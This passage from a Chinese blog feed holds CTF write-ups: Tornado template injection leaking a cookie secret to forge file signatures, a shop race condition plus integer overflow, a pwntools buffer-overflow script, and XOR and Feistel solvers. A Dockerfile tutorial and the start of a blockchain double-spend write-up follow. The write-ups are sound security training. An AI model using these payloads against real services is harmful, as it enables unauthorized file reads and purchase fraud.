      <url>/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFWP-BitPwn/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/B9GfhL7Ba8.png?imageslim" alt="mark"></p><p>打开链接是几个文件的列表：</p><p>分别打开，关注url和内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.4.79.198:31809&#x2F;file?filename&#x3D;Orz.txt&amp;signature&#x3D;0434ba1fadd43ce31661c315fbb8a9c6</span><br><span class="line"></span><br><span class="line">Orz.txt </span><br><span class="line">render()</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;49.4.79.198:31809&#x2F;file?filename&#x3D;hint.txt&amp;signature&#x3D;78423a4ae34f2a6e9088a35ef650af22</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint.txt </span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;49.4.79.198:31809&#x2F;file?filename&#x3D;flag.txt&amp;signature&#x3D;dbc862f7ca4cd3dd4ba82c6e7ff6d6af</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag.txt </span><br><span class="line">&#x2F;fllllllllllag</span><br></pre></td></tr></table></figure><p>容易看出来，读文件的url就是，<code>filename=(想读的文件名)</code>加上一个签名，</p><p>而签名是<code>md5(cookie_secret + md5(filename))</code></p><p>问题就在于<code>cookie_secret</code>是什么。</p><p>又看到<code>Orz.txt</code>里面有提示 <code>render()</code>，这个是生成模板的函数，于是想到模板注入STTI。</p><p>在读取文件失败的这个链接中，发现STTI漏洞</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.4.79.198:31809&#x2F;error?msg&#x3D;xxxx</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/k18b8gjfbL.png?imageslim" alt="mark"></p><p>但是发现有过滤，测试一下发现，过滤的特殊字符有：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;%&#39;()*-&#x2F;&#x3D;[\]_|</span><br></pre></td></tr></table></figure><p>结合Tornado框架，想到的是</p><blockquote><p>在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，具体定义可以<a href="http://tornado.readthedocs.org/en/latest/guide/templates.html#template-syntax">参考Tornado官方文档</a>！</p><p>这里我想将的是Handler这个对象，Handler指向的处理当前这个页面的RequestHandler对象！</p></blockquote><p>于是payload为:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.4.79.198:31809&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/2e0i335ibm.png?imageslim" alt="mark"></p><p>得到cookie_secret，利用这个cookie_secret，可以写脚本，来获得相应文件的签名值。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cookie_secret=<span class="string">r&#x27;WhzKS&#123;Z.*~k)L@XEt3UT%GB04(NAV[l1ojuD!-?]2Hg&lt;rx&#125;QmnCOpJ9+c8&gt;&amp;qI6s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">code</span>):</span></span><br><span class="line">temp = hashlib.md5(str(code)).hexdigest()</span><br><span class="line"><span class="keyword">return</span> temp</span><br><span class="line">filename = <span class="string">&#x27;/fllllllllllag&#x27;</span></span><br><span class="line">res = md5(cookie_secret + md5(filename))</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 89e9876bc11ab55dcf9e68d3a8877ae6</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/kjGbi6J8m6.png?imageslim" alt="mark"></p><h2 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h2><p>注册账号，进入系统，发现我们有￥20</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/midB11EDC2.png?imageslim" alt="mark"></p><p>看一下要求</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/mIE7LE062L.png?imageslim" alt="mark"></p><ol><li>￥5一包辣条</li><li>5包辣条换一包辣条王</li><li>9999999包辣条王换flag</li></ol><p>看到第三个要求，很容易想到不是常规解法，可能会用到<strong>溢出</strong>。</p><p>但是问题在于就算是溢出，我们也应该至少能换一个辣条之王才行，但是我们只有20元，只能买4包辣条，一个辣条之王也换不了。</p><p>这里算是纠结了一下，最后想到利用条件竞争，试验发现一个账户的两个登陆同时买辣条，只会扣一次钱，却会得到两个辣条。利用burpsuite进行条件竞争：</p><p>这里多设置几个线程：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/kFI1g1KC21.png?imageslim" alt="mark"></p><p>看到已经购买到很多的辣条</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/lIDlDddbAi.png?imageslim" alt="mark"></p><p>再看此时的账户，已经有足够的辣条了。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/Ec6FdEJbDf.png?imageslim" alt="mark"></p><p>下面考虑溢出：</p><p>int：    <code>2**32-1 = 4294967295</code></p><p>long：    <code>2**63 -1 = 9223372036854775807</code></p><p>longlong： <code>2**64-1 = 18446744073709551615</code></p><p>但是要<strong>注意一点，这个题的逻辑是，<code>numer*5&lt;最大值</code></strong></p><p>所以，其临界值应该为<code>18446744073709551615 / 5 == 3689348814741910323</code></p><p>于是尝试<code>3689348814741910323+1 == 3689348814741910324</code></p><p>溢出后的值比较小，在辣条的数量之内，从而兑换成功。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/HkH37D3HLm.png?imageslim" alt="mark"></p><p><strong>注意另一点，溢出的时候不能太大，因为太大导致溢出后的值过大而超过辣条的数量，出现这种情况</strong></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/KlJjg3deDe.png?imageslim" alt="mark"></p><p>此时的账户：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/D6J3816lEE.png?imageslim" alt="mark"></p><p>再兑换flag，即可：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/Khmg74KBKc.png?imageslim" alt="mark"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h2><p>用 IDA 打开程序：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181013/LK9ehJK4m2.png?imageslim" alt="mark"><br>发现可以溢出 buf 从而修改掉 v7 和 v8 的值来通过验证，所以构造利用脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./get&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;49.4.78.31&quot;</span>,<span class="number">30482</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">24</span> + p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>) + p64(<span class="number">0x3FB999999999999A</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>得到 flag ：flag{e47ba37e5e4fe4d6538f91955c63ef23}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>## 迟来的签到题</p><blockquote><p>easy xor???</p></blockquote><p>提示xor，base64解码后异或</p><p>写个脚本爆破下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str=base64.b64decode(<span class="string">&#x27;AAoHAR0jJ1AlVVEkU1BUVCAlIlFTUVUiUFRTVFVeU1FXUCVUJxs=&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">126</span>):</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        flag+= chr(ord(i)^n)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>## fez</p><p>fez.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x,k</span>):</span></span><br><span class="line">    <span class="keyword">return</span> xor(xor(x,k),<span class="number">7</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span>(<span class="params">M,K</span>):</span></span><br><span class="line">    L=M[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">    R=M[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">    new_l=R</span><br><span class="line">    new_r=xor(xor(R,L),K)</span><br><span class="line">    <span class="keyword">return</span> new_l+new_r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fez</span>(<span class="params">m,K</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">        m=round(m,i)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">K=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    K.append(os.urandom(<span class="number">27</span>))</span><br><span class="line">m=open(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">assert</span> len(m)&lt;<span class="number">54</span></span><br><span class="line">m+=os.urandom(<span class="number">54</span>-len(m))</span><br><span class="line"></span><br><span class="line">test=os.urandom(<span class="number">54</span>)</span><br><span class="line"><span class="keyword">print</span> test.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> fez(test,K).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> fez(m,K).encode(<span class="string">&quot;hex&quot;</span>)</span><br></pre></td></tr></table></figure><p>fez.log</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">048</span>d26224aae9f6be49f13202c0b173c2346909fcbba868d5d9b7431002957c5c01c546530f84e45b8a3892526401c007bca7d39b0b7</span><br><span class="line"><span class="number">69</span>d41820c61c7e8fb47fde8f09064f24af72dc6251e97e72bdc2d7c0b4696110ef84f30da6ac88b7059500f8e814cec9e9e13bcafad8</span><br><span class="line"><span class="number">32e7094533</span>a1e76ac8acdeb882c0d6965ca954d75dfd00e759b5aff9663f41d49ae70ee18fd3c067ad7ae577433ad2512b764f4b2eb2</span><br></pre></td></tr></table></figure><p>Feistel加密方法，轮函数也是异或</p><p>这里给出了print出的值，所以知道<br>1. test的值 记为<code>test</code><br>2. test加密的值 记为 <code>testans</code><br>3. flag加密的值 记为<code>ans</code></p><p><code>test</code>和用flag填充的<code>m</code>的长度都为54</p><p>加密使用的K值是不知道的，所以写不出解密函数，但可以通过给出的<code>testans</code>与<code>ans</code>异或使K消掉</p><p>记最后一轮flag加密后的为<code>L7</code>和<code>R7</code>,test加密的为<code>tL7</code>和<code>tR7</code>,初始test为<code>tL0</code>和<code>tR0</code></p><p>则<code>ai=tLi^Li=tRi+1^Ri+1^tLi+1^Li+1</code></p><p>而且<code>Ri=Li+1</code></p><p>所以<code>ai=ai+1^tLi+1^Li+1</code></p><p>最终得到L0和R0</p><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">test=<span class="string">&#x27;048d26224aae9f6be49f13202c0b173c2346909fcbba868d5d9b7431002957c5c01c546530f84e45b8a3892526401c007bca7d39b0b7&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">testans=<span class="string">&#x27;69d41820c61c7e8fb47fde8f09064f24af72dc6251e97e72bdc2d7c0b4696110ef84f30da6ac88b7059500f8e814cec9e9e13bcafad8&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">ans=<span class="string">&#x27;32e7094533a1e76ac8acdeb882c0d6965ca954d75dfd00e759b5aff9663f41d49ae70ee18fd3c067ad7ae577433ad2512b764f4b2eb2&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tL7=testans[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">tR7=testans[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">L7=ans[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">R7=ans[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"></span><br><span class="line">tL0=test[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">tR0=test[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line"><span class="comment"># a6=tR7^R7^tL7^L7^tR1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tL6^L6</span></span><br><span class="line">a6=xor(xor(tR7,R7),xor(tL7,L7))</span><br><span class="line"></span><br><span class="line">a5=xor(xor(tL7,L7),a6)</span><br><span class="line"></span><br><span class="line">a4=xor(a6,a5)</span><br><span class="line"></span><br><span class="line">a3=xor(a5,a4)</span><br><span class="line"></span><br><span class="line">a2=xor(a4,a3)</span><br><span class="line"></span><br><span class="line">a1=xor(a3,a2)</span><br><span class="line"></span><br><span class="line">a0=xor(a2,a1)</span><br><span class="line"></span><br><span class="line">L0=xor(tL0,a1)</span><br><span class="line"></span><br><span class="line">R0=xor(tR0,a0)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> R0+L0</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">λ python fez_exp.py</span><br><span class="line">flag&#123;festel_weak_666_lol88fj3820&#125;叡↓泺y蝵:;铸醛o磋萸?</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> 条件竞争 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DockerFile 定制镜像</title>
      <link href="/2018/09/22/DockerFile%E5%AE%9A%E5%88%B6%E9%95%9C%E5%83%8F/"/>
      <url>/2018/09/22/DockerFile%E5%AE%9A%E5%88%B6%E9%95%9C%E5%83%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是DockerFile"><a href="#什么是DockerFile" class="headerlink" title="什么是DockerFile"></a>什么是DockerFile</h1><p>镜像的定制实际上就是定制每一层所添加的配置、文件。如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，那么无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。这个脚本就是 Dockerfile。</p><p>Dockerfile 是一个文本文件，其内包含了一条条的指令(Instruction)，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。</p><h1 id="FROM-指定基础镜像"><a href="#FROM-指定基础镜像" class="headerlink" title="FROM 指定基础镜像"></a>FROM 指定基础镜像</h1><p>所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。而 FROM 就是指定基础镜像，因此一个 Dockerfile 中 FROM 是必备的指令，并且必须是第一条指令。</p><p>在 Docker Store 上有非常多的高质量的官方镜像，有可以直接拿来使用的服务类的镜像，如nginx 、 redis 、 mongo 、mysql 等；也有一些方便开发、构建、运行各种语言应用的镜像，如 node 、 openjdk 、 python 等。可以在其中寻找一个最符合我们最终目标的镜像为基础镜像进行定制。</p><p>如果没有找到对应服务的镜像，官方镜像中还提供了一些更为基础的操作系统镜像，如ubuntu 、 debian 、 centos 等，这些操作系统的软件库为我们提供了更广阔的扩展空间。</p><p>除了选择现有镜像为基础镜像外，Docker 还存在一个特殊的镜像，名为 scratch 。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM scratch</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果你以 scratch 为基础镜像的话，意味着你不以任何镜像为基础，接下来所写的指令将作为镜像第一层开始存在。</p><h1 id="RUN-执行命令"><a href="#RUN-执行命令" class="headerlink" title="RUN 执行命令"></a>RUN 执行命令</h1><p>  RUN 指令是用来执行命令行命令的。由于命令行的强大能力， RUN 指令在定制镜像时是最常用的指令之一。其格式有两种：</p><ul><li><p>shell 格式： RUN &lt;命令&gt; ，就像直接在命令行中输入的命令一样。刚才写的 Dockerfile 中的 RUN 指令就是这种格式。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RUN echo &#39;&lt;h1&gt;Hello, Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</span><br></pre></td></tr></table></figure></li><li><p>exec 格式： RUN [“可执行文件”, “参数1”, “参数2”]，这更像是函数调用中的格式。<br>  既然 RUN 就像 Shell 脚本一样可以执行命令，那么我们是否就可以像 Shell 脚本一样把每个命令对应一个 RUN 呢？比如这样：</p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM debian:jessie</span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN apt-get install -y gcc libc6-dev make</span><br><span class="line">RUN wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.5.tar.gz&quot;</span><br><span class="line">RUN mkdir -p &#x2F;usr&#x2F;src&#x2F;redis</span><br><span class="line">RUN tar -xzf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1</span><br><span class="line">RUN make -C &#x2F;usr&#x2F;src&#x2F;redis</span><br><span class="line">RUN make -C &#x2F;usr&#x2F;src&#x2F;redis install</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  之前说过，Dockerfile 中每一个指令都会建立一层， RUN 也不例外。每一个 RUN 的行为，就和刚才我们手工建立镜像的过程一样：新建立一层，在其上执行这些命令，执行结束后， commit 这一层的修改，构成新的镜像。</p><p>  而上面的这种写法，创建了 7 层镜像。这是完全没有意义的，而且很多运行时不需要的东西，都被装进了镜像里，比如编译环境、更新的软件包等等。结果就是产生非常臃肿、非常多层的镜像，不仅仅增加了构建部署的时间，也很容易出错。 这是很多初学 Docker 的人常犯的一个错误（我也不能原谅自己ε=(´ο｀*)))唉）。</p><p>  Union FS 是有最大层数限制的，比如 AUFS，曾经是最大不得超过 42 层，现在是不得超过127 层。</p><p>  上面的 Dockerfile 正确的写法应该是这样：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM debian:jessie</span><br><span class="line">RUN buildDeps=<span class="string">&#x27;gcc libc6-dev make&#x27;</span> \</span><br><span class="line">    &amp;&amp; apt-get update \</span><br><span class="line">    &amp;&amp; apt-get install -y <span class="variable">$buildDeps</span> \</span><br><span class="line">    &amp;&amp; wget -O redis.tar.gz <span class="string">&quot;http://download.redis.io/releases/redis-3.2.5.tar.gz&quot;</span> \</span><br><span class="line">    &amp;&amp; mkdir -p /usr/src/redis \</span><br><span class="line">    &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \</span><br><span class="line">    &amp;&amp; make -C /usr/src/redis \</span><br><span class="line">    &amp;&amp; make -C /usr/src/redis install \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/* \</span><br><span class="line">    &amp;&amp; rm redis.tar.gz \</span><br><span class="line">    &amp;&amp; rm -r /usr/src/redis \</span><br><span class="line">    &amp;&amp; apt-get purge -y --auto-remove <span class="variable">$buildDeps</span></span><br></pre></td></tr></table></figure><p>并且，这里为了格式化还进行了换行。Dockerfile 支持 Shell 类的行尾添加 \ 的命令换行方式，以及行首 # 进行注释的格式。良好的格式，比如换行、缩进、注释等，会让维护、排障更为容易，这是一个比较好的习惯。</p><p>  此外，还可以看到这一组命令的最后添加了清理工作的命令，删除了为了编译构建所需要的软件，清理了所有下载、展开的文件，并且还清理了 apt 缓存文件。这是很重要的一步，之前有说过，镜像是多层存储，每一层的东西并不会在下一层被删除，会一直跟随着镜像。因此镜像构建时，一定要确保每一层只添加真正需要添加的东西，任何无关的东西都应该清理掉。</p><h1 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h1><h2 id="执行docker-build-准备上下文失败"><a href="#执行docker-build-准备上下文失败" class="headerlink" title="执行docker build 准备上下文失败"></a>执行docker build 准备上下文失败</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unable to prepare context: unable to evaluate symlinks in Dockerfile path: lstat &#x2F;var&#x2F;docker&#x2F;Dockerfile: no such file or directory</span><br></pre></td></tr></table></figure><p>这是因为没有指定<code>DockerFile</code>的路径导致找不到。</p><p>解决上面的错误有两种方法,任选其一即可。</p><ul><li>重命名dockerfile文件名，把DockerFile改为Dockerfile</li><li>指定dockerfile，使用-f ,比如：<code>docker build -t &quot;test/run_nginx&quot; -f DockerFile .</code></li></ul><h2 id="报错bash-’-r’-command-not-found！"><a href="#报错bash-’-r’-command-not-found！" class="headerlink" title="报错bash:$’\r’: command not found！"></a>报错<code>bash:$’\r’: command not found！</code></h2><p>出现这个问题的原因是在win下编辑，然后放linux里面跑，而win的回车其实是”\r\n”,而放linux里面换行只有”\n”，所以需要将文件的格式从dos转换为unix。</p><p>这里提供三种解决方法：</p><p>a：使用dos2unix命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dos2unix   xxx.sh</span><br></pre></td></tr></table></figure><p>b:  使用vim或者vi命令</p><p>进入编辑页面之后</p><p>输入:set ff</p><p>可以看到当前的文件格式是dos，现在我们把它转unix。</p><p><code>:set ff=unix</code>或者:<code>set fileformat=unix</code></p><p>c：使用sed命令去掉”\r”</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed -i ‘s&#x2F;\r$&#x2F;&#x2F;’ &lt;filename&gt;</span><br></pre></td></tr></table></figure><h2 id="报错No-such-file-or-directory-The-command-‘-bin-sh’"><a href="#报错No-such-file-or-directory-The-command-‘-bin-sh’" class="headerlink" title="报错No such file or directory The command ‘/bin/sh’"></a>报错No such file or directory The command ‘/bin/sh’</h2><p>原因有二。</p><p>a：路径原因。</p><p>你的sh文件不在docker的/bin/sh里面。</p><p>b：同<code>bash:$’\r’: command not found！</code>报错原因</p><p>在win下编辑放linux里会报该错误。解决方法同上。</p><h2 id="Docker-build时-Sending-build-context-to-Docker-daemon-过大的问题"><a href="#Docker-build时-Sending-build-context-to-Docker-daemon-过大的问题" class="headerlink" title="Docker build时 Sending build context to Docker daemon 过大的问题"></a>Docker build时 Sending build context to Docker daemon 过大的问题</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/181023/2A376hJ9FE.png?imageslim" alt="mark"></p><p>Docker Client会默认发送Dockerfile同级目录下的所有文件到Dockerdaemon中。</p><p>解决办法有两种：</p><p>1.使用.dockerignore文件，设置黑名单，该文件包含的目录不会被发送到Docker daemon中</p><p>2.将Dockerfile迁移后其他目录中执行。</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ol><li><p><a href="https://docs.docker.com/engine/reference/builder/#usage">官方DockerFile-Reference</a></p></li><li><p><a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/">官方Best practices for writing Dockerfiles</a></p></li><li><p><a href="https://blog.csdn.net/wo18237095579/article/details/80540571">使用 Dockerfile 定制镜像</a></p></li><li><p><a href="http://120.79.189.7/?p=432">郁师傅、踩坑笔记0rz</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 系统与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF-miniblock</title>
      <link href="/2018/09/20/DDCTF-miniblock/"/>
      <url>/2018/09/20/DDCTF-miniblock/</url>
      
        <content type="html"><![CDATA[<h1 id="mini-blockchain"><a href="#mini-blockchain" class="headerlink" title="mini blockchain"></a>mini blockchain</h1><blockquote><p>某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过程。不幸的是，该银行被黑客入侵，私钥被窃取，维持区块链正常运转的矿机也全部宕机。现在，你能追回所有DDCoins，并且从商店购买2颗钻石么？</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意事项：区块链是存在cookie里的，可能会因为区块链太长，浏览器不接受服务器返回的set-cookie字段而导致区块链无法更新，因此强烈推荐写脚本发请求</span><br></pre></td></tr></table></figure><p>题目入口：<br><a href="http://116.85.48.107:5000/b982a03e1297e">http://116.85.48.107:5000/b982a03e1297e</a></p></blockquote><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>这个题需要一定的区块链基础，这两天，我也是恶补了一些这方面的知识，请教了这方面的大佬，参考了无数的大佬博客。终于写了一篇像样的<a href="https://qingchenldl.github.io/2018/09/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80/">区块链基础</a>，欢迎移步阅读。另外这两篇文章，都是新接触的知识，如有错误，望大佬指正(可以点击右侧DaoVoice联系我，或者<a href="mailto:liudonglinldl@163.com">直接发邮件</a>给我也可)</p><p>这里只说这个题目：</p><ol><li><p>本题考查<strong>51%攻击</strong>和<strong>双重花费</strong>。</p><p>我们知道，当出现两条链即区块链分叉的情况时，区块链会选择长的一条，而放弃短的一条。</p><p>所谓51%攻击，就是说当整个区块链系统中，有人掌握51%的计算力时（就像掌握51% 的股权一样），就可以影响甚至决定整条区块链的走向，我们的计算力使得我们可以更早的挖出长的链，这样就可以改变链的走向，将原有链丢弃。</p><p>所谓双重花费，指的是<strong>51%攻击</strong>的一种获利形式，掌握51%计算力以后，我就可以在使用比特币购买物品之后，伪造链，并且延长从而导致原来确认的链被丢弃，在伪造链中，我们没有花费比特币，于是可以再买一次甚至更多次。</p></li><li><p>本题我们拥有全部的算力，无人竞争。</p></li><li><p>本题采取0确认，即不需要别人确认，就如我们生活中的一手交钱一手交货，不同的是生活中我们处于中心化社会，银行会帮我们确认。而6确认就是需要经过6个人(区块被挖出)交易才确定。</p><p>  可以看到对0确认和6确认进行51%(双花)攻击的难度是不一样的，6确认需要的算力明显要大，因为他要多比其他人生成6个区块。好在，题目并不是采用6确认。</p></li></ol><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>路由如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;/&#x27;</span><span class="comment"># 首页</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;/flag&#x27;</span> <span class="comment"># 输出flag</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;/create_transaction&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;/reset&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;/source_code&#x27;</span></span><br></pre></td></tr></table></figure><p>访问首页，得到一些背景和已知信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">已知bank，shop，hacker 地址</span><br><span class="line">bank: ....3985</span><br><span class="line">hacker: ....b131</span><br><span class="line">shop: ....e735</span><br><span class="line"></span><br><span class="line">余额：</span><br><span class="line">bank： 1</span><br><span class="line">shop： 0</span><br><span class="line">hacker： 999999</span><br></pre></td></tr></table></figure><p>还有很关键的区块的情况，这里详细注释了第一个<strong>区块的json格式</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Blockchain Explorer: &#123;</span><br><span class="line">    &quot;nonce&quot;: &quot;HAHA, I AM THE BANK NOW!&quot;, &#x2F;&#x2F;附言</span><br><span class="line">    &quot;prev&quot;: 